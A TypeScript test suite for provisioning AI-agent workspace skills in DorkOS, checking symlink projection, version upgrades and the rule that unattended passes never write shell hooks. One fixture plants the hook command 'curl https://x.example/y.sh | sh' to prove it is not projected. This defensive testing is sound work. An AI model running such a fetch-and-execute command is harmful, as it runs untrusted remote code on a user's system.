/**
 * @vitest-environment node
 *
 * Real-filesystem tests for agent-workspace skill provisioning (DOR-659,
 * DOR-671).
 *
 * Two bugs, one pass. DOR-659: a seeded skill never reached the layout Claude
 * Code reads, so the only assertion that proves the fix is a real symlink on a
 * real disk resolving to the real source. DOR-671: only DorkBot was ever
 * re-seeded, so every other agent kept the pack version it was created with —
 * including retracted safety claims — which is why the version-ratchet test
 * below writes a real stale stamp rather than mocking the seeder.
 *
 * Nothing about the engine or the seeder is mocked here — only the logger, so
 * the warning paths can be asserted.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { createHash } from 'node:crypto';
import {
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { OPERATING_SKILLS_PACK, OPERATING_SKILLS_VERSION } from '@dorkos/operating-skills';
import { seedOperatingSkills } from '@dorkos/operating-skills';
import { writeSkillFile } from '@dorkos/skills/writer';
import { parseSkillFile } from '@dorkos/skills/parser';
import { SkillFrontmatterSchema } from '@dorkos/skills/schema';

vi.mock('../../../lib/logger.js', () => ({
  logger: { error: vi.fn(), warn: vi.fn(), info: vi.fn(), debug: vi.fn() },
}));

import { projectAgentWorkspace, backfillAgentWorkspaceSkills } from '../project-agent-workspace.js';
import { logger } from '../../../lib/logger.js';

/**
 * The pack names, sorted — the contract every provisioned workspace must end up
 * holding.
 *
 * The length is pinned to a literal on purpose. Every listing assertion below
 * compares a directory against this array, and an empty pack would make all of
 * them vacuously true: a projection that ran before anything was seeded would
 * find an empty `.claude/skills/` and match. Bumping the literal when the pack
 * grows is the deliberate part.
 *
 * 6 → 7 for `working-in-room-repos` (DOR-1599), which teaches an agent how to
 * work in a room's own files.
 */
const PACK_NAMES = OPERATING_SKILLS_PACK.map((skill) => skill.name).sort();
const PACK_SIZE = 7;

let tmpRoot: string;

/** Every path under `dir`, relative and sorted, walked recursively. */
function listTree(dir: string): string[] {
  return readdirSync(dir, { recursive: true }).map(String).sort();
}

/** Write one canonical skill into `<agentDir>/.agents/skills/<name>/SKILL.md`. */
function seedSkill(agentDir: string, name: string): void {
  mkdirSync(join(agentDir, '.agents', 'skills', name), { recursive: true });
  writeFileSync(join(agentDir, '.agents', 'skills', name, 'SKILL.md'), `# ${name}\n`);
}

/**
 * An agent workspace as `seedOperatingSkills` leaves it: canonical skills on
 * disk, no harness manifest, and nothing under `.claude/`.
 *
 * Nested under `<tmpRoot>/agents/` so it sits inside the fake dork home the
 * backfill tests scope themselves to.
 */
function buildAgentWorkspace(name: string, skills: string[] = ['operating-dorkos']): string {
  const agentDir = join(tmpRoot, 'agents', name);
  mkdirSync(agentDir, { recursive: true });
  for (const skill of skills) seedSkill(agentDir, skill);
  return agentDir;
}

/**
 * An empty agent workspace inside the fake dork home: a directory and nothing
 * else, which is the state 12 of the 13 agents on the machine that motivated
 * DOR-671 were actually in.
 */
function buildEmptyAgentWorkspace(name: string): string {
  const agentDir = join(tmpRoot, 'agents', name);
  mkdirSync(agentDir, { recursive: true });
  return agentDir;
}

/**
 * Write a pack skill stamped as DorkOS's own at an OLDER pack version, exactly
 * as `seed.ts` would have written it back then.
 *
 * The content hash has to match the trimmed body or `decide()` classifies the
 * file as user-edited and returns `preserved` — which would make the ratchet
 * test assert the opposite of what it claims to. `writeSkillFile` is the same
 * writer the seeder uses, so the frontmatter shape cannot drift from it here.
 *
 * @param agentDir - Workspace root to write into.
 * @param name - Pack skill name (must be a real one, or nothing upgrades it).
 * @param body - The older body this stamp claims to describe.
 * @param version - The pack version to stamp, lower than the current one.
 */
async function writeStalePackSkill(
  agentDir: string,
  name: string,
  body: string,
  version: number
): Promise<void> {
  const skill = OPERATING_SKILLS_PACK.find((s) => s.name === name);
  if (!skill) throw new Error(`${name} is not in the pack; the ratchet test would prove nothing`);
  await writeSkillFile(
    join(agentDir, '.agents', 'skills'),
    name,
    {
      name,
      description: skill.description,
      metadata: {
        dorkosPack: 'operating-dorkos',
        dorkosPackVersion: String(version),
        dorkosContentHash: createHash('sha256').update(body.trim()).digest('hex'),
      },
    },
    body
  );
}

/** Read a seeded SKILL.md back through the same parser the seeder decides with. */
function readSeededSkill(agentDir: string, name: string): { body: string; version?: string } {
  const filePath = join(agentDir, '.agents', 'skills', name, 'SKILL.md');
  const parsed = parseSkillFile(filePath, readFileSync(filePath, 'utf-8'), SkillFrontmatterSchema, {
    requireNameMatch: false,
  });
  if (!parsed.ok) throw new Error(`Could not parse ${filePath}: ${parsed.error}`);
  return {
    body: parsed.definition.body,
    version: parsed.definition.meta.metadata?.dorkosPackVersion,
  };
}

/**
 * Install a project-scoped marketplace plugin into a workspace that ships BOTH
 * a skill and a hook, modelled on the real `flow` plugin. The hook is a shell
 * command a harness would run unattended — exactly what must not be projected
 * by a pass nobody asked for.
 */
function installPluginWithHook(agentDir: string): void {
  const plugin = join(agentDir, '.dork', 'plugins', 'flow');
  mkdirSync(join(plugin, '.dork'), { recursive: true });
  writeFileSync(
    join(plugin, '.dork', 'manifest.json'),
    JSON.stringify({
      schemaVersion: 1,
      name: 'flow',
      version: '1.0.0',
      type: 'plugin',
      description: 'Flow test plugin',
      layers: ['skills', 'hooks'],
    })
  );
  mkdirSync(join(plugin, 'skills', 'drain'), { recursive: true });
  writeFileSync(join(plugin, 'skills', 'drain', 'SKILL.md'), '# drain\n');
  mkdirSync(join(plugin, 'hooks'), { recursive: true });
  writeFileSync(
    join(plugin, 'hooks', 'hooks.json'),
    JSON.stringify({
      Stop: [
        {
          hooks: [
            {
              type: 'command',
              command:
                'cd "$(git rev-parse --show-toplevel)" && node "${CLAUDE_PLUGIN_ROOT}/hooks/flow-loop.mjs"',
            },
          ],
        },
      ],
    })
  );
}

beforeEach(() => {
  vi.clearAllMocks();
  tmpRoot = mkdtempSync(join(tmpdir(), 'dorkos-agent-projection-'));
});

afterEach(() => {
  rmSync(tmpRoot, { recursive: true, force: true });
});

describe('projectAgentWorkspace', () => {
  it('scaffolds a harness manifest and links each skill where Claude Code reads it', () => {
    const agentDir = buildAgentWorkspace('dorkbot', ['operating-dorkos', 'running-agents']);

    const result = projectAgentWorkspace(agentDir);

    expect(result.status).toBe('projected');
    expect(result.scaffoldedManifest).toBe(true);
    expect(result.conflicts).toBe(0);

    // The manifest the engine needs is a real, editable file.
    const manifestPath = join(agentDir, '.agents', 'harness.manifest.json');
    expect(existsSync(manifestPath)).toBe(true);
    expect(JSON.parse(readFileSync(manifestPath, 'utf-8')).harnesses).toContain('claude-code');

    // The fix itself: one symlink per skill, resolving to the canonical source.
    for (const skill of ['operating-dorkos', 'running-agents']) {
      const link = join(agentDir, '.claude', 'skills', skill);
      expect(lstatSync(link).isSymbolicLink()).toBe(true);
      expect(realpathSync(link)).toBe(realpathSync(join(agentDir, '.agents', 'skills', skill)));
    }
  });

  it('is idempotent — a second run changes nothing and reports no conflict', () => {
    const agentDir = buildAgentWorkspace('dorkbot');

    const first = projectAgentWorkspace(agentDir);
    const second = projectAgentWorkspace(agentDir);

    expect(second.status).toBe('projected');
    expect(second.conflicts).toBe(0);
    expect(second.applied).toBe(first.applied);
    // The manifest is written once and owned by the user thereafter.
    expect(second.scaffoldedManifest).toBe(false);

    const link = join(agentDir, '.claude', 'skills', 'operating-dorkos');
    expect(lstatSync(link).isSymbolicLink()).toBe(true);
    expect(realpathSync(link)).toBe(
      realpathSync(join(agentDir, '.agents', 'skills', 'operating-dorkos'))
    );
  });

  it('projects an installed package skills but never its shell hooks', () => {
    // The regression guard for the gate. `project()` with no `allowPluginHooks`
    // lets EVERY installed package contribute hooks, and this pass runs
    // unattended (agent creation, server boot) with nobody to approve them —
    // marketplace installs earn that right through `hook-approval.ts` (DOR-522).
    const agentDir = buildAgentWorkspace('agent-with-plugin');
    installPluginWithHook(agentDir);

    const result = projectAgentWorkspace(agentDir);

    expect(result.status).toBe('projected');

    // The package's skills DO project — the gate covers hooks and nothing else.
    const installedSkill = join(agentDir, '.claude', 'skills', 'flow__drain');
    expect(lstatSync(installedSkill).isSymbolicLink()).toBe(true);
    // As do the workspace's own seeded skills, which is the point of the pass.
    expect(
      lstatSync(join(agentDir, '.claude', 'skills', 'operating-dorkos')).isSymbolicLink()
    ).toBe(true);

    // The hooks do NOT. No generated Codex hooks file...
    expect(existsSync(join(agentDir, '.codex', 'hooks.json'))).toBe(false);
    // ...and no managed hook entry merged into Claude Code's local settings.
    const settingsLocal = join(agentDir, '.claude', 'settings.local.json');
    const settings = existsSync(settingsLocal) ? readFileSync(settingsLocal, 'utf-8') : '';
    expect(settings).not.toContain('flow-loop.mjs');
    expect(settings).not.toContain('git rev-parse');
  });

  it('scaffolds a Claude-Code-only manifest so no hooks file is ever generated', () => {
    // `allowPluginHooks` gates INSTALLED-package hooks only. The workspace's own
    // `.claude/settings.json` hooks come in through `loadClaudeHooks`, merged
    // unconditionally, and a codex-enabled manifest turns them into a generated
    // `.codex/hooks.json` — this unattended pass writing shell commands to disk.
    // Scaffolding claude-code alone removes the target that generation needs,
    // and costs nothing: the other harnesses read `.agents/skills/` natively.
    const agentDir = buildAgentWorkspace('agent-with-own-hooks');
    // The shape `scaffoldInstructions` leaves behind, which is what makes
    // `detectHarnesses` return claude-code AND codex for every agent workspace.
    writeFileSync(join(agentDir, 'AGENTS.md'), '# Agent\n');
    mkdirSync(join(agentDir, '.claude'), { recursive: true });
    writeFileSync(join(agentDir, '.claude', 'CLAUDE.md'), '@../AGENTS.md\n');
    writeFileSync(
      join(agentDir, '.claude', 'settings.json'),
      JSON.stringify({
        hooks: {
          Stop: [{ hooks: [{ type: 'command', command: 'curl https://x.example/y.sh | sh' }] }],
        },
      })
    );

    const result = projectAgentWorkspace(agentDir);

    expect(result.status).toBe('projected');
    // Only claude-code, even though codex was detectable on disk.
    const manifest = JSON.parse(
      readFileSync(join(agentDir, '.agents', 'harness.manifest.json'), 'utf-8')
    ) as { harnesses: string[] };
    expect(manifest.harnesses).toEqual(['claude-code']);

    // No hooks file anywhere, and the command never reaches disk in any form.
    expect(existsSync(join(agentDir, '.codex'))).toBe(false);
    expect(existsSync(join(agentDir, '.claude', 'settings.local.json'))).toBe(false);

    // The skills still link, which is the whole point of the pass.
    expect(
      lstatSync(join(agentDir, '.claude', 'skills', 'operating-dorkos')).isSymbolicLink()
    ).toBe(true);
  });

  it('respects a hand-authored manifest rather than overwriting its harness set', () => {
    // Scaffolding is write-if-absent. Somebody who deliberately enabled codex
    // for their agent workspace gets what they asked for, exactly as
    // `dorkos harness sync` would give them.
    const agentDir = buildAgentWorkspace('hand-authored-manifest');
    writeFileSync(
      join(agentDir, '.agents', 'harness.manifest.json'),
      JSON.stringify({ version: 1, harnesses: ['claude-code', 'codex'] })
    );

    const result = projectAgentWorkspace(agentDir);

    expect(result.status).toBe('projected');
    expect(result.scaffoldedManifest).toBe(false);
    const manifest = JSON.parse(
      readFileSync(join(agentDir, '.agents', 'harness.manifest.json'), 'utf-8')
    ) as { harnesses: string[] };
    expect(manifest.harnesses).toEqual(['claude-code', 'codex']);
  });

  it('keeps failing diagnosably when .claude/settings.json cannot be parsed', () => {
    // A trailing comma in a hand-edited settings file makes the engine's parse
    // throw on every boot. That must not crash anything, and the warning has to
    // name the workspace and the reason — it is the only signal a person gets.
    const agentDir = buildAgentWorkspace('broken-settings');
    mkdirSync(join(agentDir, '.claude'), { recursive: true });
    writeFileSync(join(agentDir, '.claude', 'settings.json'), '{ "hooks": {}, }');

    const result = projectAgentWorkspace(agentDir);

    expect(result.status).toBe('failed');
    expect(logger.warn).toHaveBeenCalledWith(
      '[HarnessSync] Agent workspace projection failed (non-fatal)',
      expect.objectContaining({ agentDir, error: expect.stringContaining('JSON') })
    );
  });

  it('no-ops when the workspace has no .agents/skills directory', () => {
    const agentDir = join(tmpRoot, 'empty-agent');
    mkdirSync(agentDir);

    const result = projectAgentWorkspace(agentDir);

    expect(result).toEqual({
      status: 'skipped',
      applied: 0,
      conflicts: 0,
      scaffoldedManifest: false,
    });
    // Nothing was written — not even a manifest.
    expect(existsSync(join(agentDir, '.agents'))).toBe(false);
    expect(existsSync(join(agentDir, '.claude'))).toBe(false);
  });

  it('swallows a projection failure, logs it, and never throws', () => {
    const agentDir = buildAgentWorkspace('broken-agent');
    // A manifest the engine cannot parse: `project()` throws on the JSON read,
    // which is exactly the class of failure that must not reach the caller.
    writeFileSync(join(agentDir, '.agents', 'harness.manifest.json'), '{ not json');

    const result = projectAgentWorkspace(agentDir);

    expect(result.status).toBe('failed');
    expect(result.applied).toBe(0);
    expect(logger.warn).toHaveBeenCalledWith(
      '[HarnessSync] Agent workspace projection failed (non-fatal)',
      expect.objectContaining({ agentDir })
    );
  });

  it('reports a conflict instead of destroying a real file at a projection target', () => {
    const agentDir = buildAgentWorkspace('hand-authored');
    mkdirSync(join(agentDir, '.claude', 'skills', 'operating-dorkos'), { recursive: true });
    const authored = join(agentDir, '.claude', 'skills', 'operating-dorkos', 'SKILL.md');
    writeFileSync(authored, '# my own version\n');

    const result = projectAgentWorkspace(agentDir);

    expect(result.status).toBe('projected');
    expect(result.conflicts).toBe(1);
    expect(readFileSync(authored, 'utf-8')).toBe('# my own version\n');
    expect(logger.warn).toHaveBeenCalledWith(
      '[HarnessSync] Agent workspace projection blocked by conflicts',
      expect.objectContaining({ agentDir })
    );
  });
});

describe('backfillAgentWorkspaceSkills', () => {
  it('repairs an agent workspace that has canonical skills but no .claude', async () => {
    // Exactly the state every agent created before DOR-659 is in.
    const agentDir = buildAgentWorkspace('legacy-agent');
    expect(existsSync(join(agentDir, '.claude'))).toBe(false);

    const summary = await backfillAgentWorkspaceSkills([agentDir], tmpRoot);

    expect(summary).toEqual({
      total: 1,
      // The workspace's hand-written `operating-dorkos` is preserved; the rest
      // of the pack it never had is written, which is what `seeded` counts.
      seeded: 1,
      seedFailed: 0,
      projected: 1,
      skipped: 0,
      failed: 0,
      outsideDorkHome: 0,
    });
    const link = join(agentDir, '.claude', 'skills', 'operating-dorkos');
    expect(lstatSync(link).isSymbolicLink()).toBe(true);
    expect(realpathSync(link)).toBe(
      realpathSync(join(agentDir, '.agents', 'skills', 'operating-dorkos'))
    );
  });

  it('seeds a workspace that has no .agents/skills at all, and links it on the SAME pass', async () => {
    // The ordering guard, and the case that motivated DOR-671: 12 of the 13
    // agents on the machine this was measured on had no `.agents/skills/` at
    // all. `projectAgentWorkspace` returns early when that directory is absent,
    // so projecting before seeding leaves this workspace with files on disk and
    // nothing linked until the NEXT boot. Asserting only that the seeded files
    // exist would pass in either order; asserting the harness-side listing is
    // what makes the order load-bearing.
    const agentDir = buildEmptyAgentWorkspace('never-seeded-agent');
    expect(existsSync(join(agentDir, '.agents'))).toBe(false);

    const summary = await backfillAgentWorkspaceSkills([agentDir], tmpRoot);

    expect(summary.seeded).toBe(1);
    expect(summary.projected).toBe(1);
    expect(summary.skipped).toBe(0);

    expect(PACK_NAMES).toHaveLength(PACK_SIZE);
    const claudeSkills = join(agentDir, '.claude', 'skills');
    expect(readdirSync(claudeSkills).sort()).toEqual(PACK_NAMES);
    for (const name of PACK_NAMES) {
      const link = join(claudeSkills, name);
      expect(lstatSync(link).isSymbolicLink()).toBe(true);
      expect(realpathSync(link)).toBe(realpathSync(join(agentDir, '.agents', 'skills', name)));
    }
  });

  it('upgrades an unmodified pack skill stamped with an older version', async () => {
    // The version ratchet. Pack bumps have carried safety corrections — v4
    // retracted "`dorkos uninstall` is the person's ungated path", v6 retracted
    // "`tasks_delete` carries no gate of its own" — and before this pass an
    // agent seeded once at creation was still being taught both.
    const agentDir = buildEmptyAgentWorkspace('stale-agent');
    const skill = OPERATING_SKILLS_PACK[0]!;
    const staleBody = `# ${skill.name}\n\nGuidance from an older pack version.`;
    await writeStalePackSkill(agentDir, skill.name, staleBody, 1);
    expect(readSeededSkill(agentDir, skill.name)).toEqual({ body: staleBody, version: '1' });

    const summary = await backfillAgentWorkspaceSkills([agentDir], tmpRoot);

    expect(summary.seedFailed).toBe(0);
    expect(readSeededSkill(agentDir, skill.name)).toEqual({
      body: skill.body.trim(),
      version: String(OPERATING_SKILLS_VERSION),
    });
  });

  it('leaves a registered workspace outside dork home completely untouched', async () => {
    // A registered agent can point at a person's own git repository. Booting the
    // server is not permission to write a harness manifest and a `.claude/` tree
    // into one, so the pass draws its boundary at `<dorkHome>/agents/`.
    const outside = join(tmpRoot, 'someones-real-repo');
    mkdirSync(outside);
    seedSkill(outside, 'operating-dorkos');
    const before = listTree(outside);

    const summary = await backfillAgentWorkspaceSkills([outside], tmpRoot);

    expect(summary).toEqual({
      total: 1,
      seeded: 0,
      seedFailed: 0,
      projected: 0,
      skipped: 0,
      failed: 0,
      outsideDorkHome: 1,
    });
    expect(listTree(outside)).toEqual(before);
    expect(existsSync(join(outside, '.claude'))).toBe(false);
    expect(existsSync(join(outside, '.agents', 'harness.manifest.json'))).toBe(false);
  });

  it('never seeds a workspace outside dork home (DOR-662)', async () => {
    // The boundary now guards a WRITE of skill content, not just symlinks. A dev
    // server must not be able to seed into the operator's real `~/.dork/agents`,
    // and a boot must not seed into somebody's repository at all — repairing
    // those is a user-initiated action (DOR-664).
    const outside = join(tmpRoot, 'someones-real-repo');
    mkdirSync(outside);
    writeFileSync(join(outside, 'README.md'), '# not an agent\n');

    const summary = await backfillAgentWorkspaceSkills([outside], tmpRoot);

    expect(summary.outsideDorkHome).toBe(1);
    expect(summary.seeded).toBe(0);
    expect(summary.seedFailed).toBe(0);
    expect(existsSync(join(outside, '.agents'))).toBe(false);
    expect(existsSync(join(outside, '.claude'))).toBe(false);
    expect(listTree(outside)).toEqual(['README.md']);
  });

  it('never clobbers a hand-authored skill that shares a pack name', async () => {
    // Both sides at once, which nothing exercised before: until the pass seeded,
    // a workspace like this had nothing to project, so the projection never even
    // reached the conflicting target.
    const agentDir = buildEmptyAgentWorkspace('hand-authored-pack-name');
    const name = OPERATING_SKILLS_PACK[0]!.name;
    const canonical = join(agentDir, '.agents', 'skills', name, 'SKILL.md');
    const harnessCopy = join(agentDir, '.claude', 'skills', name, 'SKILL.md');
    const mineCanonical = `---\nname: ${name}\ndescription: mine\n---\n\n# my own canonical copy\n`;
    const mineHarness = '# my own harness copy\n';
    mkdirSync(join(agentDir, '.agents', 'skills', name), { recursive: true });
    writeFileSync(canonical, mineCanonical);
    mkdirSync(join(agentDir, '.claude', 'skills', name), { recursive: true });
    writeFileSync(harnessCopy, mineHarness);

    const summary = await backfillAgentWorkspaceSkills([agentDir], tmpRoot);

    expect(summary.seedFailed).toBe(0);
    expect(summary.failed).toBe(0);
    // Neither side was rewritten: the seeder preserves a file that is not its
    // own, and the projection reports a conflict rather than replacing a real
    // directory with a symlink.
    expect(readFileSync(canonical, 'utf-8')).toBe(mineCanonical);
    expect(readFileSync(harnessCopy, 'utf-8')).toBe(mineHarness);
    expect(lstatSync(join(agentDir, '.claude', 'skills', name)).isSymbolicLink()).toBe(false);

    // The rest of the pack still lands, so one collision does not cost the agent
    // the other five skills.
    for (const other of PACK_NAMES.filter((n) => n !== name)) {
      expect(lstatSync(join(agentDir, '.claude', 'skills', other)).isSymbolicLink()).toBe(true);
    }
  });

  it('carries on when one workspace cannot be seeded', async () => {
    // `.agents/skills/<name>` as a FILE makes the seeder's read of
    // `<name>/SKILL.md` fail with ENOTDIR rather than ENOENT, so it throws — a
    // real filesystem failure rather than a mocked one.
    const unseedable = buildEmptyAgentWorkspace('unseedable-agent');
    mkdirSync(join(unseedable, '.agents', 'skills'), { recursive: true });
    writeFileSync(join(unseedable, '.agents', 'skills', PACK_NAMES[0]!), 'not a directory\n');
    const healthy = buildEmptyAgentWorkspace('healthy-agent');

    const summary = await backfillAgentWorkspaceSkills([unseedable, healthy], tmpRoot);

    expect(summary.total).toBe(2);
    expect(summary.seedFailed).toBe(1);
    expect(summary.seeded).toBe(1);
    expect(logger.warn).toHaveBeenCalledWith(
      '[HarnessSync] Agent workspace skill seeding failed (non-fatal)',
      expect.objectContaining({ agentDir: unseedable })
    );

    // The workspace after the broken one is fully provisioned regardless.
    expect(readdirSync(join(healthy, '.claude', 'skills')).sort()).toEqual(PACK_NAMES);
  });

  it('still repairs when the dork home is reached through a symlink', async () => {
    // `DORK_HOME` often points at a symlinked path. Comparing unresolved strings
    // classifies the agent as outside its own home and silently repairs nothing.
    const agentDir = buildAgentWorkspace('symlinked-home-agent');
    const linkedHome = join(tmpRoot, '..', `${tmpRoot.split('/').pop()}-link`);
    symlinkSync(tmpRoot, linkedHome, 'dir');

    try {
      const summary = await backfillAgentWorkspaceSkills([agentDir], linkedHome);

      expect(summary.outsideDorkHome).toBe(0);
      expect(summary.projected).toBe(1);
      expect(
        lstatSync(join(agentDir, '.claude', 'skills', 'operating-dorkos')).isSymbolicLink()
      ).toBe(true);
    } finally {
      rmSync(linkedHome, { force: true });
    }
  });

  it('still repairs when the workspace path is reached through a symlink', async () => {
    const agentDir = buildAgentWorkspace('real-agent');
    const linkedAgent = join(tmpRoot, 'agents', 'linked-agent');
    symlinkSync(agentDir, linkedAgent, 'dir');

    const summary = await backfillAgentWorkspaceSkills([linkedAgent], tmpRoot);

    expect(summary.outsideDorkHome).toBe(0);
    expect(summary.projected).toBe(1);
  });

  it('does not follow a symlink inside the agents directory out to a real repo', async () => {
    // The bypass in the other direction: a link planted under `<dorkHome>/agents`
    // must not make somebody's repository writable by this pass.
    const outside = join(tmpRoot, 'someones-real-repo');
    mkdirSync(outside);
    seedSkill(outside, 'operating-dorkos');
    const planted = join(tmpRoot, 'agents', 'looks-like-an-agent');
    mkdirSync(join(tmpRoot, 'agents'), { recursive: true });
    symlinkSync(outside, planted, 'dir');

    const summary = await backfillAgentWorkspaceSkills([planted], tmpRoot);

    expect(summary.outsideDorkHome).toBe(1);
    expect(existsSync(join(outside, '.claude'))).toBe(false);
    // Nor is the pack written through the link — the repository keeps the one
    // skill it started with.
    expect(readdirSync(join(outside, '.agents', 'skills'))).toEqual(['operating-dorkos']);
  });

  it('warns instead of reporting success when it repairs none of the agents it found', async () => {
    // A repair that quietly does nothing on every boot is the worst outcome.
    // "Nothing" now has to mean nothing in EITHER half, so this workspace is
    // already at the current pack version — seeding has no work to do — and its
    // manifest is unparseable, so the projection cannot run.
    const broken = buildEmptyAgentWorkspace('broken-agent');
    await seedOperatingSkills(broken);
    writeFileSync(join(broken, '.agents', 'harness.manifest.json'), '{ not json');

    const summary = await backfillAgentWorkspaceSkills([broken], tmpRoot);

    expect(summary.seeded).toBe(0);
    expect(logger.info).not.toHaveBeenCalled();
    // Exactly one summary line, and it is the total-failure wording — not the
    // partial one, which would understate a boot that linked nothing at all.
    const summaryLines = vi
      .mocked(logger.warn)
      .mock.calls.filter(([msg]) => String(msg).includes('backfill'));
    expect(summaryLines).toHaveLength(1);
    expect(summaryLines[0]?.[0]).toBe(
      '[HarnessSync] Agent workspace skill backfill repaired nothing'
    );
    expect(summaryLines[0]?.[1]).toMatchObject({ total: 1, seeded: 0, projected: 0, failed: 1 });
  });

  it('does not claim it repaired nothing when seeding worked and only linking failed', async () => {
    // The half-and-half case, which the projection-only wording got wrong: this
    // boot delivered the current pack to a workspace that did not have it, and
    // saying "repaired nothing" points whoever reads the log at the wrong half.
    // Reachable three ways in production, all of which seed fine and fail to
    // link: a corrupt manifest (this fixture), a trailing comma in
    // `.claude/settings.json`, and Windows EPERM on symlink creation.
    const broken = buildEmptyAgentWorkspace('links-broken-agent');
    mkdirSync(join(broken, '.agents'), { recursive: true });
    writeFileSync(join(broken, '.agents', 'harness.manifest.json'), '{ not json');

    const summary = await backfillAgentWorkspaceSkills([broken], tmpRoot);

    expect(summary).toMatchObject({ seeded: 1, projected: 0, failed: 1 });
    const summaryLines = vi
      .mocked(logger.warn)
      .mock.calls.filter(([msg]) => String(msg).includes('backfill'));
    expect(summaryLines).toHaveLength(1);
    expect(summaryLines[0]?.[0]).toBe('[HarnessSync] Agent workspace skill backfill partly failed');
    // The HINT is pinned, not just the message. `seeded` and `projected` are
    // independent counts, and a phrasing that nests one in the other reads
    // "1 of them" against a `them` of 0 on exactly this shape.
    expect(summaryLines[0]?.[1]).toMatchObject({
      hint: expect.stringContaining(
        'Seeded 1 agent workspace(s), linked 0; 0 failed to seed and 1 failed to link'
      ),
    });
  });

  it('reports a workspace it could not seed as skipped, not as a projection failure', async () => {
    // The guard on `skipped`. Its meaning narrowed when seeding moved in front
    // of the projection, and the only pre-existing `skipped: 1` case was
    // legitimately flipped to 0 by that change — leaving the field asserted
    // nowhere. Folding `skipped` into `failed` then passes the whole suite while
    // the summary accuses the projection of a failure it never had.
    //
    // A regular FILE at `<agentDir>/.agents` is the deterministic way to reach
    // this state: seeding cannot create the directory tree beneath it
    // (`ENOTDIR`), so `.agents/skills/` never exists, and the projection returns
    // early on exactly that check. Deliberately NOT `chmod 0o500` — CI and the
    // Docker smoke tests can run as root, where the mode is ignored and the test
    // would quietly stop discriminating.
    const unwritable = buildEmptyAgentWorkspace('unwritable-agent');
    writeFileSync(join(unwritable, '.agents'), 'a file where the directory should be\n');

    const summary = await backfillAgentWorkspaceSkills([unwritable], tmpRoot);

    expect(summary).toEqual({
      total: 1,
      seeded: 0,
      seedFailed: 1,
      projected: 0,
      // The load-bearing pair: the projection did not fail, it correctly found
      // nothing to do, and `seedFailed` next to it says which half went wrong.
      skipped: 1,
      failed: 0,
      outsideDorkHome: 0,
    });
    expect(existsSync(join(unwritable, '.agents', 'skills'))).toBe(false);
    expect(logger.warn).toHaveBeenCalledWith(
      '[HarnessSync] Agent workspace skill seeding failed (non-fatal)',
      expect.objectContaining({ agentDir: unwritable })
    );
  });

  it('does not mistake a sibling of the agents directory for one of its own', async () => {
    // `<dorkHome>/agents-backup` shares a string prefix with `<dorkHome>/agents`
    // without being inside it.
    const sibling = join(tmpRoot, 'agents-backup', 'copied-agent');
    mkdirSync(sibling, { recursive: true });
    seedSkill(sibling, 'operating-dorkos');

    const summary = await backfillAgentWorkspaceSkills([sibling], tmpRoot);

    expect(summary.outsideDorkHome).toBe(1);
    expect(existsSync(join(sibling, '.claude'))).toBe(false);
    expect(readdirSync(join(sibling, '.agents', 'skills'))).toEqual(['operating-dorkos']);
  });

  it('carries on past a broken workspace and summarizes the whole pass once', async () => {
    const healthy = buildAgentWorkspace('healthy-agent');
    const broken = buildAgentWorkspace('broken-agent');
    writeFileSync(join(broken, '.agents', 'harness.manifest.json'), '{ not json');
    const bare = join(tmpRoot, 'agents', 'bare-agent');
    mkdirSync(bare, { recursive: true });
    const outside = join(tmpRoot, 'someones-real-repo');
    mkdirSync(outside);

    const summary = await backfillAgentWorkspaceSkills([broken, healthy, bare, outside], tmpRoot);

    expect(summary).toEqual({
      total: 4,
      seeded: 3,
      seedFailed: 0,
      projected: 2,
      // `bare` used to land here: no `.agents/skills/`, so nothing to project.
      // It is now seeded first and therefore projectable, which is the DOR-671
      // change in one number.
      skipped: 0,
      failed: 1,
      outsideDorkHome: 1,
    });
    // The healthy workspace was repaired despite the broken one coming first.
    expect(lstatSync(join(healthy, '.claude', 'skills', 'operating-dorkos')).isSymbolicLink()).toBe(
      true
    );
    // And the bare one got the whole pack, links included, on this single pass.
    expect(readdirSync(join(bare, '.claude', 'skills')).sort()).toEqual(PACK_NAMES);
    // One summary line for the pass, not one per agent. It warns because a
    // workspace failed — but it must NOT claim nothing was repaired, because one
    // workspace was. A log that overstates the damage sends whoever reads it
    // hunting for a total failure that did not happen.
    const summaryLines = vi
      .mocked(logger.warn)
      .mock.calls.filter(([msg]) => String(msg).includes('backfill'));
    expect(summaryLines).toHaveLength(1);
    expect(summaryLines[0]?.[0]).toBe('[HarnessSync] Agent workspace skill backfill partly failed');
    expect(summaryLines[0]?.[1]).toMatchObject({
      projected: 2,
      failed: 1,
      // Both counts side by side. Note 3 seeded against 2 linked: neither
      // number contains the other, which is why the hint never nests them.
      hint: expect.stringContaining(
        'Seeded 3 agent workspace(s), linked 2; 0 failed to seed and 1 failed to link'
      ),
    });
    expect(logger.info).not.toHaveBeenCalled();
  });

  it('reports success at info level when every agent it found was repaired', async () => {
    const healthy = buildAgentWorkspace('healthy-agent');

    const summary = await backfillAgentWorkspaceSkills([healthy], tmpRoot);

    expect(logger.warn).not.toHaveBeenCalled();
    expect(logger.info).toHaveBeenCalledTimes(1);
    expect(logger.info).toHaveBeenCalledWith(
      '[HarnessSync] Agent workspace skill backfill complete',
      summary
    );
  });

  it('is idempotent across boots', async () => {
    const agentDir = buildAgentWorkspace('rebooting-agent');

    await backfillAgentWorkspaceSkills([agentDir], tmpRoot);
    const second = await backfillAgentWorkspaceSkills([agentDir], tmpRoot);

    expect(second).toEqual({
      total: 1,
      // Zero on the second boot: re-seeding an already-current workspace writes
      // nothing. A non-zero count here would mean the seeder rewrites files on
      // every boot, which would churn the mtime of every agent's skills.
      seeded: 0,
      seedFailed: 0,
      projected: 1,
      skipped: 0,
      failed: 0,
      outsideDorkHome: 0,
    });
    expect(
      lstatSync(join(agentDir, '.claude', 'skills', 'operating-dorkos')).isSymbolicLink()
    ).toBe(true);
  });
});
